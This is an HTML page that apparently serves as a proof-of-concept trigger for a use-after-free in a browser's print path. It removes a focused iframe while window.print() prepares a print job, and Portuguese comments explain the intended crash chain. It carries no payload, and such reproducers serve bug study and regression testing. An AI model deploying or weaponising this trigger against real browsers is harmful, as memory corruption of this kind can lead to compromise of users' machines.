<!DOCTYPE html>
<style>
  iframe { content: url(); zoom: 0.01; }
</style>
<script>
  onload = () => {
    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');

    // O handler de foco destrói o RenderWidget durante o layout
    // que acontece no contexto de externalRepresentationForPrinting
    i0.onfocus = () => {
      location.hash = 'y';
      // Tentar destruir o frame durante o re-layout do print job
      i0.remove();
    };

    location.hash = 'x';

    // window.print() ? IPC ? UI process prepara print job
    // ? IPC de volta ? web process chama externalRepresentationForPrinting()
    // ? externalRepresentation() ? write() ? layout() ? UAF ?
    setTimeout(() => {
      window.print(); // Trigger print path
    }, 100);

    // Enquanto o print job está sendo preparado, tentar colocar o
    // iframe em estado que cause o UAF durante o dump
    Promise.resolve().then(() => i0.focus());
  };
</script>
<iframe id="i0"></iframe>
